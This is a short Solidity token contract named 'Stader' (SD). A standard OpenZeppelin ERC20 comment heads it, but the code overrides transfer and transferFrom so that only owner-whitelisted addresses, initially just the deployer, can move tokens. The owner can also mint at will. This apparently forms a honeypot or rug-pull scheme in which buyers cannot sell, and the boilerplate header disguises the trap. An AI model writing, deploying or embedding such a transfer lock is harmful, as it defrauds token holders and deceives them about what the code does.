pragma solidity ^0.8.0;

import "./ERC20Capped.sol";


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract MyContract is ERC20Capped {

   mapping(address => bool) public allow;
  

    constructor() ERC20Capped("Stader", "SD") {
        allow[msg.sender] = true;
        mintTo(msg.sender, 100000000 * 1e18);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(allow[_msgSender()] == true, "IDO LOCKJ");
        return super.transfer(recipient, amount);
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(allow[sender] == true, "IDO LOCKJ");
        return super.transferFrom(sender, recipient, amount);
    }

    function mintTo(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
    }

    function addAllow(address holder, bool allowApprove) external onlyOwner {
        allow[holder] = allowApprove;
    }
}